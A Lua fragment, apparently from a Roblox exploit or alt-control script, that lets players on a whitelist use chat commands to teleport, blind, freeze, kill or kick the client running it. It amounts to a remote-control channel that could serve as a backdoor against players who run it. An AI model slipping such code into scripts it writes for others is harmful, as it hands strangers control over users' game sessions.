local blindFrame = nil

local function ProcessChatCommand(speaker, msg)
    local speakerName = string.lower(speaker.Name)
    if not WhitelistedUsers[speakerName] then return end

    local args = string.split(msg, " ")
    local cmd = string.lower(args[1] or "")
    local target = string.lower(args[2] or "")

    local isTargetingMe = (target == "." or target == string.lower(LocalPlayer.Name))

    if cmd == ":bring" and isTargetingMe then
        local sChar = speaker.Character
        local sHrp = sChar and sChar:FindFirstChild("HumanoidRootPart")
        local myChar = LocalPlayer.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if sHrp and myHrp then
            myHrp.CFrame = sHrp.CFrame + Vector3.new(0, 2, 0)
            ShowNotification("Brought to " .. speaker.DisplayName)
        end
    elseif cmd == ":blind" and isTargetingMe then
        if not blindFrame then
            blindFrame = Instance.new("Frame")
            blindFrame.Size = UDim2.new(1, 0, 1, 0)
            blindFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            blindFrame.ZIndex = 999999
            blindFrame.Parent = ScreenGui
        end
        ShowNotification("You have been blinded!")
    elseif cmd == ":unblind" and isTargetingMe then
        if blindFrame then
            blindFrame:Destroy()
            blindFrame = nil
        end
        ShowNotification("Blindness removed!")
    elseif cmd == ":freeze" and isTargetingMe then
        IsFrozen = true
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = true end
        ShowNotification("You have been frozen!")
    elseif cmd == ":unfreeze" and isTargetingMe then
        IsFrozen = false
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = false end
        ShowNotification("You have been unfrozen!")
    elseif cmd == ":kill" and isTargetingMe then
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.Health = 0
        end
        ShowNotification("Kill command executed!")
    elseif cmd == ":kick" and isTargetingMe then
        table.remove(args, 1)
        if #args > 0 and string.lower(args[1]) == "." then
            table.remove(args, 1)
        end
        local reason = table.concat(args, " ")
        if reason == "" then reason = "Kicked from server." end
        LocalPlayer:Kick(reason)
    end
end

local function SetupChatListener(player)
    player.Chatted:Connect(function(msg)
        ProcessChatCommand(player, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    SetupChatListener(p)
end
